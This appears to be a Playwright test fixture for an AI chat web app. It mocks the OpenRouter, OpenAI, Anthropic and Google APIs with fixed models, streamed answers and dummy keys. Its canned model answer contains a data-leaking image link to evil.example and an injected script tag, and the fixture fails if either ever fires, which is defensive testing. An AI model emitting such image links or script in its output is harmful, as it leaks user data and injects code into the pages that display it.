import { test as base, expect, type BrowserContext, type Page } from '@playwright/test'

export const MODELS = [
  { id: 'openrouter/auto', name: 'Auto Router', pricing: { prompt: '-1', completion: '-1' } },
  {
    id: 'anthropic/claude-test',
    name: 'Anthropic: Claude Test',
    pricing: { prompt: '0.000003', completion: '0.000015' },
    architecture: { input_modalities: ['text', 'image', 'file'], output_modalities: ['text'] },
  },
  {
    id: 'text/only',
    name: 'Text Only Model',
    architecture: { input_modalities: ['text'], output_modalities: ['text'] },
  },
  { id: 'openai/broke', name: 'OpenAI: Out Of Credits', pricing: { prompt: '0.00000015', completion: '0.0000006' } },
  { id: 'image/only', name: 'Image Only', architecture: { output_modalities: ['image'] } },
]

export const ANSWER = [
  'Here is a **bold** answer:',
  '',
  '```ts',
  'const greet = (name: string) => `Hello, ${name}`',
  '```',
  '',
  '![tracker](https://evil.example/pixel.png?leak=1)',
  '',
  '<script>window.__pwned = true</script>',
].join('\n')

export const OAUTH_KEY = 'sk-or-v1-oauth-0123456789'

export interface OpenRouterMock {
  /** Parsed JSON bodies of chat completion requests, in order. */
  chatRequests: Record<string, unknown>[]
  keyExchanges: number
  /** Chat requests sent straight to OpenAI, Anthropic or Google. */
  directRequests: { provider: string; url: string; headers: Record<string, string>; body: Record<string, unknown> }[]
}

export const DIRECT_ANSWER = 'Hello from a direct provider'

function sse(text: string): string {
  let body = ': OPENROUTER PROCESSING\n\n'
  for (const chunk of text.match(/[\s\S]{1,10}/g) ?? []) {
    body += `data: ${JSON.stringify({ choices: [{ delta: { content: chunk } }] })}\n\n`
  }
  const usage = { prompt_tokens: 12, completion_tokens: 30, cost: 0.00042 }
  body += `data: ${JSON.stringify({ choices: [{ delta: {} }], usage })}\n\ndata: [DONE]\n\n`
  return body
}

function anthropicSse(text: string): string {
  const events: { type: string; [key: string]: unknown }[] = [
    {
      type: 'message_start',
      message: {
        id: 'msg_e2e',
        type: 'message',
        role: 'assistant',
        model: 'claude-opus-5-5',
        content: [],
        stop_reason: null,
        stop_sequence: null,
        usage: { input_tokens: 10, output_tokens: 1 },
      },
    },
    { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } },
    { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } },
    { type: 'content_block_stop', index: 0 },
    { type: 'message_delta', delta: { stop_reason: 'end_turn', stop_sequence: null }, usage: { output_tokens: 5 } },
    { type: 'message_stop' },
  ]
  return events.map((e) => `event: ${e.type}\ndata: ${JSON.stringify(e)}\n\n`).join('')
}

/** OpenAI, Anthropic and Google, each with one model and a fixed answer. */
async function mockDirectProviders(context: BrowserContext, mock: OpenRouterMock) {
  const headers = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*' }
  const sseHeaders = { ...headers, 'Content-Type': 'text/event-stream' }

  const record = (provider: string, request: import('@playwright/test').Request) =>
    mock.directRequests.push({ provider, url: request.url(), headers: request.headers(), body: request.postDataJSON() })

  await context.route('https://api.openai.com/**', async (route) => {
    const request = route.request()
    if (request.method() === 'OPTIONS') return route.fulfill({ status: 204, headers })
    const path = new URL(request.url()).pathname
    if (path === '/v1/models') {
      return route.fulfill({ json: { data: [{ id: 'gpt-5', created: 2 }, { id: 'whisper-1', created: 1 }] }, headers })
    }
    record('openai', request)
    const body = `data: ${JSON.stringify({ choices: [{ delta: { content: DIRECT_ANSWER } }] })}\n\n`
    const usage = `data: ${JSON.stringify({ choices: [], usage: { prompt_tokens: 8, completion_tokens: 4 } })}\n\n`
    return route.fulfill({ body: `${body}${usage}data: [DONE]\n\n`, headers: sseHeaders })
  })

  await context.route('https://api.anthropic.com/**', async (route) => {
    const request = route.request()
    if (request.method() === 'OPTIONS') return route.fulfill({ status: 204, headers })
    const path = new URL(request.url()).pathname
    if (path === '/v1/models') {
      const model = {
        type: 'model',
        id: 'claude-opus-5-5',
        display_name: 'Claude Opus 5.5',
        created_at: '2026-09-01T00:00:00Z',
        max_input_tokens: 1_000_000,
        max_tokens: 128_000,
        capabilities: { thinking: { supported: true, types: { adaptive: { supported: true } } } },
      }
      return route.fulfill({
        json: { data: [model], has_more: false, first_id: model.id, last_id: model.id },
        headers,
      })
    }
    record('anthropic', request)
    return route.fulfill({ body: anthropicSse(DIRECT_ANSWER), headers: sseHeaders })
  })

  await context.route('https://generativelanguage.googleapis.com/**', async (route) => {
    const request = route.request()
    if (request.method() === 'OPTIONS') return route.fulfill({ status: 204, headers })
    if (request.method() === 'GET') {
      const model = {
        name: 'models/gemini-2.5-flash',
        displayName: 'Gemini 2.5 Flash',
        supportedGenerationMethods: ['generateContent'],
      }
      return route.fulfill({ json: { models: [model] }, headers })
    }
    record('google', request)
    const chunk = {
      candidates: [{ content: { parts: [{ text: DIRECT_ANSWER }] }, finishReason: 'STOP' }],
      usageMetadata: { promptTokenCount: 6, candidatesTokenCount: 3 },
    }
    return route.fulfill({ body: `data: ${JSON.stringify(chunk)}\n\n`, headers: sseHeaders })
  })
}

async function mockOpenRouter(context: BrowserContext): Promise<OpenRouterMock> {
  const mock: OpenRouterMock = { chatRequests: [], keyExchanges: 0, directRequests: [] }
  await mockDirectProviders(context, mock)
  const headers = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*' }

  await context.route('https://openrouter.ai/**', async (route) => {
    const request = route.request()
    const path = new URL(request.url()).pathname
    if (request.method() === 'OPTIONS') return route.fulfill({ status: 204, headers })
    if (path === '/api/v1/models') return route.fulfill({ json: { data: MODELS }, headers })
    if (path === '/api/v1/key') return route.fulfill({ json: { data: { usage: 1.23, limit: 10 } }, headers })
    if (path === '/api/v1/auth/keys') {
      mock.keyExchanges++
      return route.fulfill({ json: { key: OAUTH_KEY, user_id: null }, headers })
    }
    if (path === '/api/v1/chat/completions') {
      const body = request.postDataJSON()
      mock.chatRequests.push(body)
      if (body.model === 'openai/broke') {
        return route.fulfill({ status: 402, json: { error: { code: 402, message: 'Insufficient credits' } }, headers })
      }
      return route.fulfill({ body: sse(ANSWER), headers: { ...headers, 'Content-Type': 'text/event-stream' } })
    }
    return route.fulfill({ status: 404, headers })
  })

  // Remote images in model output must never be fetched.
  await context.route('https://evil.example/**', (route) => {
    throw new Error(`Leaked request to ${route.request().url()}`)
  })
  return mock
}

export const test = base.extend<{ openrouter: OpenRouterMock }>({
  // Auto: no test may reach the real OpenRouter. (`provide` is Playwright's `use`, renamed for the hooks lint.)
  openrouter: [async ({ context }, provide) => provide(await mockOpenRouter(context)), { auto: true }],
})

export { expect }

/** Starts the app with an API key already saved, as a returning user. */
export async function openWithKey(page: Page, path = '/') {
  await page.addInitScript(() => {
    if (localStorage.getItem('aimvp.settings')) return
    localStorage.setItem(
      'aimvp.settings',
      JSON.stringify({ state: { apiKey: 'sk-or-v1-test-0123456789', theme: 'light' }, version: 1 }),
    )
  })
  await page.goto(path)
}

export const composer = (page: Page) => page.getByLabel('Message', { exact: true })
